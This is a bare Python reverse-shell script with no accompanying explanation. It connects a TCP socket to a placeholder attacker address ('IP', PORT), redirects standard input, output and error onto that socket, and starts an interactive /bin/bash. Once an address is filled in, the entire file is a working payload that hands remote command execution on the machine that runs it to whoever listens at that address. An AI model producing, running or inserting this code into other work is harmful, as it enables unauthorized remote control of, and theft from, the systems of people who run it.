import os
import socket
import subprocess

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
socket.connect(("IP", PORT));

os.dup2(socket.fileno(),0);
os.dup2(socket.fileno(),1);
os.dup2(socket.fileno(),2);

proc = subprocess.call(["/bin/bash", "-i"]);
